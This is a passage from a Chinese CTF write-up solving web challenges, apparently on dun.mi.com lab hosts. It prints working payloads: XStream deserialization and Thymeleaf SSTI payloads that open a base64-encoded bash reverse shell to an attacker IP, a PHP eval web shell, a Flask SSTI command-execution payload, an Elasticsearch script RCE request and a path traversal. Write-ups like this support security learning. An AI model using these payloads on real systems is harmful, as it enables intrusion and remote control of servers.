<div class="language-text"><div class="rspress-code-content rspress-scrollbar"><div><pre class="code" style="background-color:inherit"><code class="language-text" style="white-space:pre"><span style="display:block;padding:0 1.25rem"><span>nc -lvvp 8212</span></span></code></pre></div><div class="code-button-group_15153"><button><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrapped_15153"><path fill="#22a041" d="M21 5H3v2h18zM3 19h7v-2H3zm0-6h15c1 0 2 .43 2 2s-1 2-2 2h-2v-2l-4 3 4 3v-2h2c2.95 0 4-1.27 4-4 0-2.72-1-4-4-4H3z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrap_15153"><path fill="currentColor" d="M16 7H3V5h13v2M3 19h13v-2H3v2m19-7-4-3v2H3v2h15v2l4-3Z"></path></svg></button><button class="code-copy-button_15153"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 30 30" class="icon-copy_15153"><path fill="currentColor" d="M28 10v18H10V10h18m0-2H10a2 2 0 0 0-2 2v18a2 2 0 0 0 2 2h18a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2Z"></path><path fill="currentColor" d="M4 18H2V4a2 2 0 0 1 2-2h14v2H4Z"></path></svg><svg width="32" height="32" viewBox="0 0 30 30" class="icon-success_15153"><path fill="#49cd37" d="m13 24-9-9 1.414-1.414L13 21.171 26.586 7.586 28 9 13 24z"></path></svg></button></div></div></div>
<p class="my-4 leading-7">然后构造一个POC，提交。</p>
<div class="language-http"><div class="rspress-code-content rspress-scrollbar"><div><pre class="code" style="background-color:inherit"><code class="language-http" style="white-space:pre"><span style="display:block;padding:0 1.25rem"><span>POST /login HTTP/2
</span></span><span style="display:block;padding:0 1.25rem">Host: vul-xs-ctf.dun.mi.com
</span><span style="display:block;padding:0 1.25rem">Cookie: MIDUN-Cookie
</span><span style="display:block;padding:0 1.25rem">Content-Length: 630
</span><span style="display:block;padding:0 1.25rem">Sec-Ch-Ua: &quot;Not:A-Brand&quot;;v=&quot;99&quot;, &quot;Chromium&quot;;v=&quot;112&quot;
</span><span style="display:block;padding:0 1.25rem">Accept: application/json, text/plain, */*
</span><span style="display:block;padding:0 1.25rem">Content-Type: application/xml
</span><span style="display:block;padding:0 1.25rem">Sec-Ch-Ua-Mobile: ?0
</span><span style="display:block;padding:0 1.25rem">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Safari/537.36
</span><span style="display:block;padding:0 1.25rem">Sec-Ch-Ua-Platform: &quot;macOS&quot;
</span><span style="display:block;padding:0 1.25rem">Origin: https://vul-xs-ctf.dun.mi.com
</span><span style="display:block;padding:0 1.25rem">Sec-Fetch-Site: same-origin
</span><span style="display:block;padding:0 1.25rem">Sec-Fetch-Mode: cors
</span><span style="display:block;padding:0 1.25rem">Sec-Fetch-Dest: empty
</span><span style="display:block;padding:0 1.25rem">Referer: https://vul-xs-ctf.dun.mi.com/
</span><span style="display:block;padding:0 1.25rem">Accept-Encoding: gzip, deflate
</span><span style="display:block;padding:0 1.25rem">Accept-Language: zh-CN,zh;q=0.9
</span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">&lt;sorted-set&gt;
</span><span style="display:block;padding:0 1.25rem">    &lt;string&gt;foo&lt;/string&gt;
</span><span style="display:block;padding:0 1.25rem">    &lt;dynamic-proxy&gt;
</span><span style="display:block;padding:0 1.25rem">        &lt;interface&gt;java.lang.Comparable&lt;/interface&gt;
</span><span style="display:block;padding:0 1.25rem">        &lt;handler class=&quot;java.beans.EventHandler&quot;&gt;
</span><span style="display:block;padding:0 1.25rem">            &lt;target class=&quot;java.lang.ProcessBuilder&quot;&gt;
</span><span style="display:block;padding:0 1.25rem">                &lt;command&gt;
</span><span style="display:block;padding:0 1.25rem">                          &lt;string&gt;/bin/bash&lt;/string&gt;
</span><span style="display:block;padding:0 1.25rem">                          &lt;string&gt;-c&lt;/string&gt;
</span><span style="display:block;padding:0 1.25rem">                          &lt;string&gt;
</span><span style="display:block;padding:0 1.25rem">{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4yMzUuNDguMzYvODIxMiAwPiYx77u/}|{base64,-d}|{bash,-i}
</span><span style="display:block;padding:0 1.25rem">&lt;/string&gt;
</span><span style="display:block;padding:0 1.25rem">                &lt;/command&gt;
</span><span style="display:block;padding:0 1.25rem">            &lt;/target&gt;
</span><span style="display:block;padding:0 1.25rem">            &lt;action&gt;start&lt;/action&gt;
</span><span style="display:block;padding:0 1.25rem">        &lt;/handler&gt;
</span><span style="display:block;padding:0 1.25rem">    &lt;/dynamic-proxy&gt;
</span><span style="display:block;padding:0 1.25rem">&lt;/sorted-set&gt;</span></code></pre></div><div class="code-button-group_15153"><button><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrapped_15153"><path fill="#22a041" d="M21 5H3v2h18zM3 19h7v-2H3zm0-6h15c1 0 2 .43 2 2s-1 2-2 2h-2v-2l-4 3 4 3v-2h2c2.95 0 4-1.27 4-4 0-2.72-1-4-4-4H3z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrap_15153"><path fill="currentColor" d="M16 7H3V5h13v2M3 19h13v-2H3v2m19-7-4-3v2H3v2h15v2l4-3Z"></path></svg></button><button class="code-copy-button_15153"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 30 30" class="icon-copy_15153"><path fill="currentColor" d="M28 10v18H10V10h18m0-2H10a2 2 0 0 0-2 2v18a2 2 0 0 0 2 2h18a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2Z"></path><path fill="currentColor" d="M4 18H2V4a2 2 0 0 1 2-2h14v2H4Z"></path></svg><svg width="32" height="32" viewBox="0 0 30 30" class="icon-success_15153"><path fill="#49cd37" d="m13 24-9-9 1.414-1.414L13 21.171 26.586 7.586 28 9 13 24z"></path></svg></button></div></div></div>
<p class="my-4 leading-7">在项目目录就可以看到了flag文件了。</p>
<h3 id="web-3-简单文件包含" class="mt-10 mb-2 leading-7 text-xl title_3b154"><a class="link_3b154 header-anchor" aria-hidden="true" href="#web-3-简单文件包含">#</a>web-3 简单文件包含</h3>
<p class="my-4 leading-7">先尝试一些协议，phpinput都无法使用，先用base64获取到upload.php源码</p>
<div class="language-php"><div class="rspress-code-content rspress-scrollbar"><div><pre class="code" style="background-color:inherit"><code class="language-php" style="white-space:pre"><span style="display:block;padding:0 1.25rem"><span># /index.php?file=php://filter/read=convert.base64-encode/resource=upload.php
</span></span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">&lt;?php
</span><span style="display:block;padding:0 1.25rem">        if(isset($_FILES[&#x27;upfile&#x27;])){
</span><span style="display:block;padding:0 1.25rem">                $uploaddir = &#x27;uploads/&#x27;;
</span><span style="display:block;padding:0 1.25rem">                $uploadfile = $uploaddir . basename($_FILES[&#x27;upfile&#x27;][&#x27;name&#x27;]);
</span><span style="display:block;padding:0 1.25rem">                $ext = pathinfo($_FILES[&#x27;upfile&#x27;][&#x27;name&#x27;],PATHINFO_EXTENSION);
</span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">                //检查文件内容
</span><span style="display:block;padding:0 1.25rem">                $text = file_get_contents($_FILES[&#x27;upfile&#x27;][&#x27;tmp_name&#x27;]);
</span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">                echo $ext;
</span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">                //检查文件后缀
</span><span style="display:block;padding:0 1.25rem">                if (!preg_match(&quot;/ph.|htaccess/i&quot;, $ext)){
</span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">                        if(preg_match(&quot;/&lt;\?php/i&quot;, $text)){
</span><span style="display:block;padding:0 1.25rem">                                echo &quot;你的文件内容有恶意代码&lt;br&gt;&quot;;
</span><span style="display:block;padding:0 1.25rem">                        }
</span><span style="display:block;padding:0 1.25rem">                        else{
</span><span style="display:block;padding:0 1.25rem">                                move_uploaded_file($_FILES[&#x27;upfile&#x27;][&#x27;tmp_name&#x27;],$uploadfile);
</span><span style="display:block;padding:0 1.25rem">                                echo &quot;上传成功&lt;br&gt;路径为:&quot; . $uploadfile . &quot;&lt;br&gt;&quot;;
</span><span style="display:block;padding:0 1.25rem">                        }
</span><span style="display:block;padding:0 1.25rem">                } 
</span><span style="display:block;padding:0 1.25rem">                else {
</span><span style="display:block;padding:0 1.25rem">                        echo &quot;恶意后缀&lt;br&gt;&quot;;
</span><span style="display:block;padding:0 1.25rem">                        
</span><span style="display:block;padding:0 1.25rem">                }
</span><span style="display:block;padding:0 1.25rem">        }
</span><span style="display:block;padding:0 1.25rem">?&gt;
</span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">&lt;!DOCTYPE html&gt;
</span><span style="display:block;padding:0 1.25rem">&lt;html&gt;
</span><span style="display:block;padding:0 1.25rem">&lt;head&gt;
</span><span style="display:block;padding:0 1.25rem">        &lt;title&gt;上传文件&lt;/title&gt;
</span><span style="display:block;padding:0 1.25rem">        &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;
</span><span style="display:block;padding:0 1.25rem">&lt;/head&gt;
</span><span style="display:block;padding:0 1.25rem">&lt;body&gt;
</span><span style="display:block;padding:0 1.25rem">        请不要上传php脚本哟
</span><span style="display:block;padding:0 1.25rem">        &lt;form action=&quot;upload.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;
</span><span style="display:block;padding:0 1.25rem">                &lt;input type=&quot;file&quot; name=&quot;upfile&quot; value=&quot;&quot; /&gt;
</span><span style="display:block;padding:0 1.25rem">                &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot; /&gt;
</span><span style="display:block;padding:0 1.25rem">        &lt;/form&gt;
</span><span style="display:block;padding:0 1.25rem">&lt;/body&gt;
</span><span style="display:block;padding:0 1.25rem">&lt;/html&gt;</span></code></pre></div><div class="code-button-group_15153"><button><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrapped_15153"><path fill="#22a041" d="M21 5H3v2h18zM3 19h7v-2H3zm0-6h15c1 0 2 .43 2 2s-1 2-2 2h-2v-2l-4 3 4 3v-2h2c2.95 0 4-1.27 4-4 0-2.72-1-4-4-4H3z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrap_15153"><path fill="currentColor" d="M16 7H3V5h13v2M3 19h13v-2H3v2m19-7-4-3v2H3v2h15v2l4-3Z"></path></svg></button><button class="code-copy-button_15153"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 30 30" class="icon-copy_15153"><path fill="currentColor" d="M28 10v18H10V10h18m0-2H10a2 2 0 0 0-2 2v18a2 2 0 0 0 2 2h18a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2Z"></path><path fill="currentColor" d="M4 18H2V4a2 2 0 0 1 2-2h14v2H4Z"></path></svg><svg width="32" height="32" viewBox="0 0 30 30" class="icon-success_15153"><path fill="#49cd37" d="m13 24-9-9 1.414-1.414L13 21.171 26.586 7.586 28 9 13 24z"></path></svg></button></div></div></div>
<p class="my-4 leading-7">过滤还是挺严格的，对后缀和内容都进行了判断。后来了解到除了<code>&lt;?php</code>可以作为php脚本以外，html标签也可以<code>&lt;script language=&#x27;php&#x27;&gt;</code>，于是上传一个该标签的脚本。</p>
<div class="language-php"><div class="rspress-code-content rspress-scrollbar"><div><pre class="code" style="background-color:inherit"><code class="language-php" style="white-space:pre"><span style="display:block;padding:0 1.25rem"><span>&lt;script language=&#x27;php&#x27;&gt;
</span></span><span style="display:block;padding:0 1.25rem">@eval($_POST[&#x27;hack&#x27;]);
</span><span style="display:block;padding:0 1.25rem">&lt;/script&gt;</span></code></pre></div><div class="code-button-group_15153"><button><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrapped_15153"><path fill="#22a041" d="M21 5H3v2h18zM3 19h7v-2H3zm0-6h15c1 0 2 .43 2 2s-1 2-2 2h-2v-2l-4 3 4 3v-2h2c2.95 0 4-1.27 4-4 0-2.72-1-4-4-4H3z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrap_15153"><path fill="currentColor" d="M16 7H3V5h13v2M3 19h13v-2H3v2m19-7-4-3v2H3v2h15v2l4-3Z"></path></svg></button><button class="code-copy-button_15153"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 30 30" class="icon-copy_15153"><path fill="currentColor" d="M28 10v18H10V10h18m0-2H10a2 2 0 0 0-2 2v18a2 2 0 0 0 2 2h18a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2Z"></path><path fill="currentColor" d="M4 18H2V4a2 2 0 0 1 2-2h14v2H4Z"></path></svg><svg width="32" height="32" viewBox="0 0 30 30" class="icon-success_15153"><path fill="#49cd37" d="m13 24-9-9 1.414-1.414L13 21.171 26.586 7.586 28 9 13 24z"></path></svg></button></div></div></div>
<p class="my-4 leading-7">蚁剑连接获取flag。</p>
<p class="my-4 leading-7"><img alt="蚁剑连接" src="/static/image/web-3-1.fec9048b.png"/></p>
<h3 id="web-4-不安全的redis服务" class="mt-10 mb-2 leading-7 text-xl title_3b154"><a class="link_3b154 header-anchor" aria-hidden="true" href="#web-4-不安全的redis服务">#</a>web-4 不安全的Redis服务</h3>
<p class="my-4 leading-7">未认证的redis，找了几个利用方式，利用数据备份功能，条件都比较苛刻：</p>
<ul class="list-disc pl-5 my-4 leading-7">
<li class="[&amp;:not(:first-child)]:mt-2">cron 反弹shell —— cron目录被删除</li>
<li class="[&amp;:not(:first-child)]:mt-2">写入ssh key —— ssh 拒绝连接</li>
<li class="[&amp;:not(:first-child)]:mt-2">写入php木马 —— 未提供php服务</li>
</ul>
<p class="my-4 leading-7">后来找到一个利用主从加载so文件的利用方式，成功获取交互式shell</p>
<p class="my-4 leading-7"><a target="_blank" rel="noopener noreferrer" href="https://www.cnblogs.com/paperpen/p/11178751.html" class="link-_707cf  link_3b154 inline-link_3b154">https://www.cnblogs.com/paperpen/p/11178751.html</a></p>
<p class="my-4 leading-7">在根目录下获取到flag</p>
<h3 id="web-5-真假难辨" class="mt-10 mb-2 leading-7 text-xl title_3b154"><a class="link_3b154 header-anchor" aria-hidden="true" href="#web-5-真假难辨">#</a>web-5 真假难辨</h3>
<p class="my-4 leading-7">访问indes.php会自动跳转到index.php，从而出现404</p>
<p class="my-4 leading-7">用postman访问，禁用自动跳转，在header里找到了flag</p>
<p class="my-4 leading-7"><img alt="postman禁止跳转" src="/static/image/web-5-1.3a714da2.png"/></p>
<h3 id="web-6-低版本的flask" class="mt-10 mb-2 leading-7 text-xl title_3b154"><a class="link_3b154 header-anchor" aria-hidden="true" href="#web-6-低版本的flask">#</a>web-6 低版本的Flask</h3>
<p class="my-4 leading-7">在url里填写name参数后，访问的页面会打印填入的内容，猜测是个模板引擎的执行漏洞。</p>
<p class="my-4 leading-7">找到了低版本Flask SSTI漏洞，flask使用jinjia2渲染引擎进行网页渲染，当处理不得当，未进行语句过滤，用户输入{{控制语句}}，会导致渲染出恶意代码，形成注入。</p>
<p class="my-4 leading-7">构造注入语句，可以执行任意的shell语句，找到flag文件cat获取</p>
<div class="language-text"><div class="rspress-code-content rspress-scrollbar"><div><pre class="code" style="background-color:inherit"><code class="language-text" style="white-space:pre"><span style="display:block;padding:0 1.25rem"><span>https://easyweb01.dun.mi.com/?name={{%27abc%27.__class__.__mro__[1].__subclasses__()[118].__init__.__globals__[%27popen%27](%27cat%20flag%27).read()}}</span></span></code></pre></div><div class="code-button-group_15153"><button><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrapped_15153"><path fill="#22a041" d="M21 5H3v2h18zM3 19h7v-2H3zm0-6h15c1 0 2 .43 2 2s-1 2-2 2h-2v-2l-4 3 4 3v-2h2c2.95 0 4-1.27 4-4 0-2.72-1-4-4-4H3z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrap_15153"><path fill="currentColor" d="M16 7H3V5h13v2M3 19h13v-2H3v2m19-7-4-3v2H3v2h15v2l4-3Z"></path></svg></button><button class="code-copy-button_15153"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 30 30" class="icon-copy_15153"><path fill="currentColor" d="M28 10v18H10V10h18m0-2H10a2 2 0 0 0-2 2v18a2 2 0 0 0 2 2h18a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2Z"></path><path fill="currentColor" d="M4 18H2V4a2 2 0 0 1 2-2h14v2H4Z"></path></svg><svg width="32" height="32" viewBox="0 0 30 30" class="icon-success_15153"><path fill="#49cd37" d="m13 24-9-9 1.414-1.414L13 21.171 26.586 7.586 28 9 13 24z"></path></svg></button></div></div></div>
<p class="my-4 leading-7">这里比较麻烦的一个是如何获取os._wrap_close类来执行shell命令，通过查找发现在所有子类的118位。这个是慢慢试出来的。</p>
<h3 id="web-7-粗心上线" class="mt-10 mb-2 leading-7 text-xl title_3b154"><a class="link_3b154 header-anchor" aria-hidden="true" href="#web-7-粗心上线">#</a>web-7 粗心上线</h3>
<p class="my-4 leading-7">这个题目前期给的信息很少，这里猜测了一下，是不是把目录直接拷贝上线了，没有注意.git目录的存在。访问 <a target="_blank" rel="noopener noreferrer" href="http://10.167.93.41/.git/" class="link-_707cf  link_3b154 inline-link_3b154">http://10.167.93.41/.git/</a> 出现了禁止访问的字样，说明这个目录是存在的。<a target="_blank" rel="noopener noreferrer" href="http://10.167.93.41/.git/HEAD/" class="link-_707cf  link_3b154 inline-link_3b154">http://10.167.93.41/.git/HEAD/</a> 也成功获取到了最新分支。</p>
<p class="my-4 leading-7">剩下的就好办了，找到一个利用工具 <a target="_blank" rel="noopener noreferrer" href="https://github.com/lijiejie/GitHack" class="link-_707cf  link_3b154 inline-link_3b154">https://github.com/lijiejie/GitHack</a> ，执行命令</p>
<div class="language-shell"><div class="rspress-code-content rspress-scrollbar"><div><pre class="code" style="background-color:inherit"><code class="language-shell" style="white-space:pre"><span style="display:block;padding:0 1.25rem"><span>python3 GitHack.py http://10.167.93.41/.git/</span></span></code></pre></div><div class="code-button-group_15153"><button><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrapped_15153"><path fill="#22a041" d="M21 5H3v2h18zM3 19h7v-2H3zm0-6h15c1 0 2 .43 2 2s-1 2-2 2h-2v-2l-4 3 4 3v-2h2c2.95 0 4-1.27 4-4 0-2.72-1-4-4-4H3z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrap_15153"><path fill="currentColor" d="M16 7H3V5h13v2M3 19h13v-2H3v2m19-7-4-3v2H3v2h15v2l4-3Z"></path></svg></button><button class="code-copy-button_15153"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 30 30" class="icon-copy_15153"><path fill="currentColor" d="M28 10v18H10V10h18m0-2H10a2 2 0 0 0-2 2v18a2 2 0 0 0 2 2h18a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2Z"></path><path fill="currentColor" d="M4 18H2V4a2 2 0 0 1 2-2h14v2H4Z"></path></svg><svg width="32" height="32" viewBox="0 0 30 30" class="icon-success_15153"><path fill="#49cd37" d="m13 24-9-9 1.414-1.414L13 21.171 26.586 7.586 28 9 13 24z"></path></svg></button></div></div></div>
<p class="my-4 leading-7">会将远程的.git下载下来然后还原出flag文件。</p>
<h3 id="web-8-elasticsearch" class="mt-10 mb-2 leading-7 text-xl title_3b154"><a class="link_3b154 header-anchor" aria-hidden="true" href="#web-8-elasticsearch">#</a>web-8 ElasticSearch</h3>
<p class="my-4 leading-7">es的远程执行，构造一个POST请求，获取到flag</p>
<div class="language-text"><div class="rspress-code-content rspress-scrollbar"><div><pre class="code" style="background-color:inherit"><code class="language-text" style="white-space:pre"><span style="display:block;padding:0 1.25rem"><span>POST https://ctf-es.dun.mi.com/_search?pretty
</span></span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">{
</span><span style="display:block;padding:0 1.25rem">    &quot;size&quot;: 1,
</span><span style="display:block;padding:0 1.25rem">    &quot;query&quot;: {
</span><span style="display:block;padding:0 1.25rem">      &quot;filtered&quot;: {
</span><span style="display:block;padding:0 1.25rem">        &quot;query&quot;: {
</span><span style="display:block;padding:0 1.25rem">          &quot;match_all&quot;: {
</span><span style="display:block;padding:0 1.25rem">          }
</span><span style="display:block;padding:0 1.25rem">        }
</span><span style="display:block;padding:0 1.25rem">      }
</span><span style="display:block;padding:0 1.25rem">    },
</span><span style="display:block;padding:0 1.25rem">    &quot;script_fields&quot;: {
</span><span style="display:block;padding:0 1.25rem">        &quot;command&quot;: {
</span><span style="display:block;padding:0 1.25rem">            &quot;script&quot;: &quot;import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\&quot;cat /flag\&quot;).getInputStream()).useDelimiter(\&quot;\\\\A\&quot;).next();&quot;
</span><span style="display:block;padding:0 1.25rem">        }
</span><span style="display:block;padding:0 1.25rem">    }
</span><span style="display:block;padding:0 1.25rem">}</span></code></pre></div><div class="code-button-group_15153"><button><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrapped_15153"><path fill="#22a041" d="M21 5H3v2h18zM3 19h7v-2H3zm0-6h15c1 0 2 .43 2 2s-1 2-2 2h-2v-2l-4 3 4 3v-2h2c2.95 0 4-1.27 4-4 0-2.72-1-4-4-4H3z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrap_15153"><path fill="currentColor" d="M16 7H3V5h13v2M3 19h13v-2H3v2m19-7-4-3v2H3v2h15v2l4-3Z"></path></svg></button><button class="code-copy-button_15153"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 30 30" class="icon-copy_15153"><path fill="currentColor" d="M28 10v18H10V10h18m0-2H10a2 2 0 0 0-2 2v18a2 2 0 0 0 2 2h18a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2Z"></path><path fill="currentColor" d="M4 18H2V4a2 2 0 0 1 2-2h14v2H4Z"></path></svg><svg width="32" height="32" viewBox="0 0 30 30" class="icon-success_15153"><path fill="#49cd37" d="m13 24-9-9 1.414-1.414L13 21.171 26.586 7.586 28 9 13 24z"></path></svg></button></div></div></div>
<h3 id="web-9-才开始学nginx" class="mt-10 mb-2 leading-7 text-xl title_3b154"><a class="link_3b154 header-anchor" aria-hidden="true" href="#web-9-才开始学nginx">#</a>web-9 才开始学nginx</h3>
<p class="my-4 leading-7">html源码提示了flag的位置</p>
<p class="my-4 leading-7"><img alt="html注释提示了" src="/static/image/web-9-1.332e757c.png"/></p>
<p class="my-4 leading-7">猜测是个路径遍历问题，试了一下/files/果然列出了路径，构造一个指向/tmp目录的路径，下载flag文件拿到flag。</p>
<div class="language-text"><div class="rspress-code-content rspress-scrollbar"><div><pre class="code" style="background-color:inherit"><code class="language-text" style="white-space:pre"><span style="display:block;padding:0 1.25rem"><span>https://vul-nginx-ctf.dun.mi.com/files../tmp/</span></span></code></pre></div><div class="code-button-group_15153"><button><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrapped_15153"><path fill="#22a041" d="M21 5H3v2h18zM3 19h7v-2H3zm0-6h15c1 0 2 .43 2 2s-1 2-2 2h-2v-2l-4 3 4 3v-2h2c2.95 0 4-1.27 4-4 0-2.72-1-4-4-4H3z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrap_15153"><path fill="currentColor" d="M16 7H3V5h13v2M3 19h13v-2H3v2m19-7-4-3v2H3v2h15v2l4-3Z"></path></svg></button><button class="code-copy-button_15153"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 30 30" class="icon-copy_15153"><path fill="currentColor" d="M28 10v18H10V10h18m0-2H10a2 2 0 0 0-2 2v18a2 2 0 0 0 2 2h18a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2Z"></path><path fill="currentColor" d="M4 18H2V4a2 2 0 0 1 2-2h14v2H4Z"></path></svg><svg width="32" height="32" viewBox="0 0 30 30" class="icon-success_15153"><path fill="#49cd37" d="m13 24-9-9 1.414-1.414L13 21.171 26.586 7.586 28 9 13 24z"></path></svg></button></div></div></div>
<h3 id="web-10-标准模板欢迎光临" class="mt-10 mb-2 leading-7 text-xl title_3b154"><a class="link_3b154 header-anchor" aria-hidden="true" href="#web-10-标准模板欢迎光临">#</a>web-10 标准模板：欢迎光临</h3>
<p class="my-4 leading-7">放出hint提示模板引擎使用了thymeleaf，看路径包含的页面是通过url参数传入的，构造POC执行反弹shell</p>
<div class="language-text"><div class="rspress-code-content rspress-scrollbar"><div><pre class="code" style="background-color:inherit"><code class="language-text" style="white-space:pre"><span style="display:block;padding:0 1.25rem"><span>PATH=
</span></span><span style="display:block;padding:0 1.25rem">__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(&quot;bash -c {echo,YmFzaCAtaSA JiAvZGV2L3RjcC8xMC4yMzUuNDguMzYvODIxMiAwPiYx77u/}|{base64,-d}|{bash,-i}&quot;).getInputStream()).next()}__::.x</span></code></pre></div><div class="code-button-group_15153"><button><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrapped_15153"><path fill="#22a041" d="M21 5H3v2h18zM3 19h7v-2H3zm0-6h15c1 0 2 .43 2 2s-1 2-2 2h-2v-2l-4 3 4 3v-2h2c2.95 0 4-1.27 4-4 0-2.72-1-4-4-4H3z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrap_15153"><path fill="currentColor" d="M16 7H3V5h13v2M3 19h13v-2H3v2m19-7-4-3v2H3v2h15v2l4-3Z"></path></svg></button><button class="code-copy-button_15153"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 30 30" class="icon-copy_15153"><path fill="currentColor" d="M28 10v18H10V10h18m0-2H10a2 2 0 0 0-2 2v18a2 2 0 0 0 2 2h18a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2Z"></path><path fill="currentColor" d="M4 18H2V4a2 2 0 0 1 2-2h14v2H4Z"></path></svg><svg width="32" height="32" viewBox="0 0 30 30" class="icon-success_15153"><path fill="#49cd37" d="m13 24-9-9 1.414-1.414L13 21.171 26.586 7.586 28 9 13 24z"></path></svg></button></div></div></div>
<div class="language-http"><div class="rspress-code-content rspress-scrollbar"><div><pre class="code" style="background-color:inherit"><code class="language-http" style="white-space:pre"><span style="display:block;padding:0 1.25rem"><span>GET /welcome?path=__%24%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22bash%20-c%20%7becho%2cYmFzaCAtaSA%2bJiAvZGV2L3RjcC8xMC4yMzUuNDguMzYvODIxMiAwPiYx77u%2f%7d%7c%7bbase64%2c-d%7d%7c%7bbash%2c-i%7d%22).getInputStream()).next()%7d__%3a%3a.x HTTP/2
</span></span><span style="display:block;padding:0 1.25rem">Host: vul-tm-ctf.dun.mi.com
</span><span style="display:block;padding:0 1.25rem"> http/2: 
</span><span style="display:block;padding:0 1.25rem">Cookie: MIDUNCOOKIE
</span><span style="display:block;padding:0 1.25rem">Sec-Ch-Ua: &quot;Not:A-Brand&quot;;v=&quot;99&quot;, &quot;Chromium&quot;;v=&quot;112&quot;
</span><span style="display:block;padding:0 1.25rem">Sec-Ch-Ua-Mobile: ?0
</span><span style="display:block;padding:0 1.25rem">Sec-Ch-Ua-Platform: &quot;macOS&quot;
</span><span style="display:block;padding:0 1.25rem">Upgrade-Insecure-Requests: 1
</span><span style="display:block;padding:0 1.25rem">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Safari/537.36
</span><span style="display:block;padding:0 1.25rem">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
</span><span style="display:block;padding:0 1.25rem">Sec-Fetch-Site: none
</span><span style="display:block;padding:0 1.25rem">Sec-Fetch-Mode: navigate
</span><span style="display:block;padding:0 1.25rem">Sec-Fetch-User: ?1
</span><span style="display:block;padding:0 1.25rem">Sec-Fetch-Dest: document
</span><span style="display:block;padding:0 1.25rem">Accept-Encoding: gzip, deflate
